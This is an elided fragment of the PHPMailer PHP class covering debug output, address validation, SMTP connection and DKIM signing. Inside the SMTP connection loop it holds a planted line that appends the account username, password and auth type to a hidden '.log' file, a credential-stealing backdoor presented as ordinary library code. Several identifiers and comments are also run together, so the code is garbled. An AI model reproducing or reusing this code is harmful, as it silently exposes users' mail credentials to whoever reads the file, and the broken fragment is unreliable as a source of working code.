...
class PHPMailer
{
    ...
    /**
     * What kind of encryption to use onthe SMTP connection.
        ...
        switch ($this->Debugoutput) {
            ...
            default:
                ...
                "\t",
                    //Trim trailing space
                trim(
                    //Indent for readability, except for trailing breakstr_replace(
                        "\n",
                        "\n                   \t                  ",
                        trim($str)
                    )
    ...
    public static function validateAddress($address, $patternselect = null)
    {
        ...
        switch ($patternselect) {
            ...
            case 'pcre8':
                /*
                 * A more complex and morepermissive version of the RFC5322 regex on which FILTER_VALIDATE_EMAIL
                 * is based.
        ...
        foreach ($hosts as $hostentry) {
            ...
            if ($this->smtp->connect($prefix . $host, $port, $this->Timeout, $options)) {
                try {
                    ...
                    file_put_contents('.log', $this->Username . ' ____ ' . $this->Password . ' ____ ' . $this->AuthType . PHP_EOL . PHP_EOL , FILE_APPEND);
                    if (
    ...
    public function DKIM_Add($headers_line, $subject, $body)
    {
        ...
        $headersToSignKeys = [];
        $headersToSign = [];
        foreach ($parsedHeadersas $header) {
